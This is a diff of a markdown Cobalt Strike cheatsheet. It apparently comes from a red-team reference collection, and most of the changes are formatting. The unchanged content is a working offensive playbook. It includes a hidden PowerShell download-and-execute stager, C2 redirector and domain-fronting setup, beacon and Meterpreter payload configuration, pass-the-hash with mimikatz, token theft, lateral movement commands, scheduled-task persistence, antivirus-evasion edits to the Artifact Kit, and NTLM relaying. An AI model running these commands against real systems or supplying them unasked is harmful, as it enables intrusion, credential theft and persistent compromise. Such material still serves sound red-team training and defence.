@@ -2,7 +2,6 @@
 
 > Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
 
-
 ```powershell
 $ sudo apt-get update
 $ sudo apt-get install openjdk-11-jdk
@@ -15,31 +14,30 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
 
 ## Summary
 
-* [Infrastructure](#infrastructure)
-    * [Redirectors](#redirectors)
-    * [Domain fronting](#domain-fronting)
-    * [OpSec](#opsec)
-* [Payloads](#payloads)
-    * [DNS Beacon](#dns-beacon)
-    * [SMB Beacon](#smb-beacon)
-    * [Metasploit compatibility](#metasploit-compatibility)
-    * [Custom Payloads](#custom-payloads)
-* [Malleable C2](#malleable-c2)
-* [Files](#files)
-* [Powershell and .NET](#powershell-and-net)
-    * [Powershell commabds](#powershell-commands)
-    * [.NET remote execution](#net-remote-execution)
-* [Lateral Movement](#lateral-movement)
-* [VPN & Pivots](#vpn--pivots)
-* [Kits](#kits)
-    * [Elevate Kit](#elevate-kit)
-    * [Persistence Kit](#persistence-kit)
-    * [Resource Kit](#resource-kit)
-    * [Artifact Kit](#artifact-kit)
-    * [Mimikatz Kit](#mimikatz-kit)
-* [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
-* [References](#references)
-
+* [Infrastructure](<Cobalt Strike - Cheatsheet.md#infrastructure>)
+  * [Redirectors](<Cobalt Strike - Cheatsheet.md#redirectors>)
+  * [Domain fronting](<Cobalt Strike - Cheatsheet.md#domain-fronting>)
+  * [OpSec](<Cobalt Strike - Cheatsheet.md#opsec>)
+* [Payloads](<Cobalt Strike - Cheatsheet.md#payloads>)
+  * [DNS Beacon](<Cobalt Strike - Cheatsheet.md#dns-beacon>)
+  * [SMB Beacon](<Cobalt Strike - Cheatsheet.md#smb-beacon>)
+  * [Metasploit compatibility](<Cobalt Strike - Cheatsheet.md#metasploit-compatibility>)
+  * [Custom Payloads](<Cobalt Strike - Cheatsheet.md#custom-payloads>)
+* [Malleable C2](<Cobalt Strike - Cheatsheet.md#malleable-c2>)
+* [Files](<Cobalt Strike - Cheatsheet.md#files>)
+* [Powershell and .NET](<Cobalt Strike - Cheatsheet.md#powershell-and-net>)
+  * [Powershell commabds](<Cobalt Strike - Cheatsheet.md#powershell-commands>)
+  * [.NET remote execution](<Cobalt Strike - Cheatsheet.md#net-remote-execution>)
+* [Lateral Movement](<Cobalt Strike - Cheatsheet.md#lateral-movement>)
+* [VPN & Pivots](<Cobalt Strike - Cheatsheet.md#vpn--pivots>)
+* [Kits](<Cobalt Strike - Cheatsheet.md#kits>)
+  * [Elevate Kit](<Cobalt Strike - Cheatsheet.md#elevate-kit>)
+  * [Persistence Kit](<Cobalt Strike - Cheatsheet.md#persistence-kit>)
+  * [Resource Kit](<Cobalt Strike - Cheatsheet.md#resource-kit>)
+  * [Artifact Kit](<Cobalt Strike - Cheatsheet.md#artifact-kit>)
+  * [Mimikatz Kit](<Cobalt Strike - Cheatsheet.md#mimikatz-kit>)
+* [NTLM Relaying via Cobalt Strike](<Cobalt Strike - Cheatsheet.md#ntlm-relaying-via-cobalt-strike>)
+* [References](<Cobalt Strike - Cheatsheet.md#references>)
 
 ## Infrastructure
 
@@ -53,23 +51,24 @@ socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
 ### Domain Fronting
 
 * New Listener > HTTP Host Header
-* Target Finance & Healthcare domains 
+* Target Finance & Healthcare domains
 
 ### OpSec
 
 **Don't**
+
 * Change default self-signed HTTPS certificate
 * Change default port (50050)
 * 0.0.0.0 DNS response
 * Metasploit compatibility, ask for a payload : `wget -U "Internet Explorer" http://127.0.0.1/vl6D`
 
 **Do**
+
 * Use a redirector (Apache, CDN, ...)
 * Firewall to only accept HTTP/S from the redirectors
 * Firewall 50050 and access via SSH tunnel
 * Edit default HTTP 404 page and Content type: text/plain
 * No staging `set hosts_stage` to `false` in Malleable C2
-
 
 ## Payload
 
@@ -101,12 +100,12 @@ echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
 ```
 
 Configuration:
+
 1. **host**: campaigns.domain.com
 2. **beacon**: polling.campaigns.domain.com
 3. Interact with a beacon, and `sleep 0`
 
-
-### SMB Beacon   
+### SMB Beacon
 
 ```powershell
 link [host] [pipename]
@@ -117,12 +116,11 @@ jump [exec] [host] [pipe]
 
 SMB Beacon uses Named Pipes. You might encounter these error code while running it.
 
-| Error Code | Meaning              | Description                                        |
-|------------|----------------------|----------------------------------------------------|
-| 2          | File Not Found       | There is no beacon for you to link to              |
-| 5          | Access is denied     | Invalid credentials or you don't have permission   |
-| 53         | Bad Netpath          | You have no trust relationship with the target system. It may or may not be a beacon there. |
-
+| Error Code | Meaning          | Description                                                                                 |
+| ---------- | ---------------- | ------------------------------------------------------------------------------------------- |
+| 2          | File Not Found   | There is no beacon for you to link to                                                       |
+| 5          | Access is denied | Invalid credentials or you don't have permission                                            |
+| 53         | Bad Netpath      | You have no trust relationship with the target system. It may or may not be a beacon there. |
 
 ### SSH Beacon
 
@@ -147,7 +145,7 @@ shell                     Execute a command via the shell
 
 ### Metasploit compatibility
 
-* Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https
+* Payload: windows/meterpreter/reverse\_http or windows/meterpreter/reverse\_https
 * Set LHOST and LPORT to the beacon
 * Set DisablePayloadHandler to True
 * Set PrependMigrate to True
@@ -255,7 +253,6 @@ http-post {
 }
 ```
 
-
 ## Files
 
 ```powershell
@@ -304,9 +301,10 @@ beacon > psinject [pid][arch] [commandlet] [arguments]
 
 ### .NET remote execution
 
-Run a local .NET executable as a Beacon post-exploitation job. 
+Run a local .NET executable as a Beacon post-exploitation job.
 
 Require:
+
 * Binaries compiled with the "Any CPU" configuration.
 
 ```powershell
@@ -328,20 +326,20 @@ beacon > execute-assembly /home/audit/Rubeus.exe
 
 ## Lateral Movement
 
-:warning: OPSEC Advice: Use the **spawnto** command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe 
+:warning: OPSEC Advice: Use the **spawnto** command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe
 
-- **portscan:** Performs a portscan on a spesific target.
-- **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
-- **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
-:exclamation: This module needs Administrator privileges.
-- **steal_token:** Steal a token from a specified process.
-- **make_token:** By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
-- **jump:** Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \
-:exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target. \
-:muscle: We can combine the **jump** module with the **make_token** or **pth** module for a quick "jump" to another target on the network.
-- **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi. \
-:exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
-- **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts.
+* **portscan:** Performs a portscan on a spesific target.
+* **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
+* **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process.\
+  :exclamation: This module needs Administrator privileges.
+* **steal\_token:** Steal a token from a specified process.
+* **make\_token:** By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
+* **jump:** Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target.\
+  :exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target.\
+  :muscle: We can combine the **jump** module with the **make\_token** or **pth** module for a quick "jump" to another target on the network.
+* **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi.\
+  :exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
+* **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts.
 
 :warning: All the commands launch powershell.exe
 
@@ -365,10 +363,10 @@ remote-exec [module] [target] [command]
     psexec                          Remote execute via Service Control Manager
     winrm                           Remote execute via WinRM (PowerShell)
     wmi                             Remote execute via WMI (PowerShell)
-
 ```
 
 Opsec safe Pass-the-Hash:
+
 1. `mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
 2. `steal_token PID`
 
@@ -376,7 +374,6 @@ Opsec safe Pass-the-Hash:
 
 * Use `link` to connect to SMB Beacon
 * Use `connect` to connect to TCP Beacon
-
 
 ## VPN & Pivots
 
@@ -405,7 +402,7 @@ beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
 
 ## Kits
 
-* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike
+* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community\_kit/) - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike
 
 ### Elevate Kit
 
@@ -430,7 +427,8 @@ Beacon Command Elevators
 ### Persistence Kit
 
 * https://github.com/0xthirteen/MoveKit
-* https://github.com/fireeye/SharPersist
+*   https://github.com/fireeye/SharPersist
+
     ```powershell
     # List persistences
     SharPersist -t schtaskbackdoor -m list
@@ -459,14 +457,14 @@ Beacon Command Elevators
 
 Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 
-- Download the artifact kit : `Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)`
-- Install the dependencies : `sudo apt-get install mingw-w64`
-- Edit the Artifact code
-    * Change pipename strings
-    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
-    * Change Import
-- Build the Artifact
-- Cobalt Strike -> Script Manager > Load .cna
+* Download the artifact kit : `Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)`
+* Install the dependencies : `sudo apt-get install mingw-w64`
+* Edit the Artifact code
+  * Change pipename strings
+  * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
+  * Change Import
+* Build the Artifact
+* Cobalt Strike -> Script Manager > Load .cna
 
 ### Mimikatz Kit
 
@@ -489,16 +487,16 @@ beacon> PortBender redirect 445 8445
 * [Red Team Ops with Cobalt Strike (1 of 9): Operations](https://www.youtube.com/watch?v=q7VQeK533zI)
 * [Red Team Ops with Cobalt Strike (2 of 9): Infrastructure](https://www.youtube.com/watch?v=5gwEMocFkc0)
 * [Red Team Ops with Cobalt Strike (3 of 9): C2](https://www.youtube.com/watch?v=Z8n9bIPAIao)
-* [Red Team Ops with Cobalt Strike (4 of 9): Weaponization](https://www.youtube.com/watch?v=H0_CKdwbMRk)
+* [Red Team Ops with Cobalt Strike (4 of 9): Weaponization](https://www.youtube.com/watch?v=H0\_CKdwbMRk)
 * [Red Team Ops with Cobalt Strike (5 of 9): Initial Access](https://www.youtube.com/watch?v=bYt85zm4YT8)
 * [Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation](https://www.youtube.com/watch?v=Pb6yvcB2aYw)
 * [Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation](https://www.youtube.com/watch?v=lzwwVwmG0io)
-* [Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement](https://www.youtube.com/watch?v=QF_6zFLmLn0)
-* [Red Team Ops with Cobalt Strike (9 of 9): Pivoting](https://www.youtube.com/watch?v=sP1HgUu7duU&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&index=10&t=0s)
-* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 ](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
+* [Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement](https://www.youtube.com/watch?v=QF\_6zFLmLn0)
+* [Red Team Ops with Cobalt Strike (9 of 9): Pivoting](https://www.youtube.com/watch?v=sP1HgUu7duU\&list=PL9HO6M\_MU2nfQ4kHSCzAQMqxQxH47d1no\&index=10\&t=0s)
+* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
 * [Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019](https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/)
 * [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
 * [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
 * [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
 * [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
-* [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
+* [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome\_main.htm)
